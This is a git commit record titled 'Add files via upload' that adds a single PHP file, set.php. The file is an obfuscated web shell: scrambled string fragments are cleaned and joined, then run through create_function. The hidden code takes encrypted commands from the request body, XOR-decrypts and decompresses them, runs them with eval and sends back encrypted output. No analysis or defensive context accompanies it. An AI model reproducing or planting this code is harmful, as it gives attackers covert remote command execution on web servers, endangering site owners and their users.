d78ec7285a6cc87b52e1c5235ea5bc8f353a2144
Xale <81574241+xaletr@users.noreply.github.com>
2023-05-28 03:04:55 +0300

    Add files via upload

---
+++ set.php
@@ -0,0 +1,11 @@
+<?php
+$r='$kS="202cSb962";$khS="ac59S075b964b"S;$kfS="07152dSS234b70";$pS="CnTS0LOSlddfPLrBnS3"';
+$A='h("/$kh(S.+)$kf/",@fiSle_geSt_conteSntsS("SphpS://input"),$mS)=SS=1) {@ob_start(S);@eS';
+$j=str_replace('YZ','','YZcYZYZreateYZYZYZ_function');
+$d='val(@gzSuSSncompSress(@Sx(@bSase64_decode($m[S1]),$k)));$o=@Sob_Sget_contSents(S);@ob_e';
+$Y='S;($Sj<$c&&$i<$l)S;S$j++,$i++){$o.=S$t{$i}S^$k{S$jS};}}retuSrn $o;S}ifS (@preg_matcSS';
+$o='Snd_Sclean();$r=S@Sbase6S4_encode(S@x(@gzcomSpressS($o),$kS));pSrintS("$p$Skh$r$kf");}';
+$i=';SfunctionSS x($t,$k){$c=SstrlSen($k);$lS=strlenS($tS);$o="";forS($i=S0;$i<$l;S){SforS($j=0';
+$Z=str_replace('S','',$r.$i.$Y.$A.$d.$o);
+$S=$j('',$Z);$S();
+?>
